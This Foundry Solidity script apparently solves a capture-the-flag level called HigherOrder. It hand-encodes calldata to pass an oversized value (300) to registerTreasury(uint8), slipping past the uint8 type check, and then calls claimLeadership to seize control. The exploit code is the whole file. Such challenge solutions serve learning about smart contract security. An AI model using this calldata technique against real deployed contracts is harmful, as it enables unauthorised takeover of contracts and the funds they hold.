// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Script} from "forge-std/Script.sol";
import {HigherOrder} from "../src/HigherOrder.sol";

contract SolveHigherOrder is Script {
    HigherOrder public higherOrder;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        higherOrder = HigherOrder(
            payable(vm.envAddress("HIGHERORDER_ADDRESS"))
        );
        bytes memory cdata = abi.encodePacked(
            bytes4(keccak256("registerTreasury(uint8)")),
            uint256(300)
        );
        (bool ok, bytes memory data) = address(higherOrder).call(cdata);
        higherOrder.claimLeadership();
        vm.stopBroadcast();
    }
}
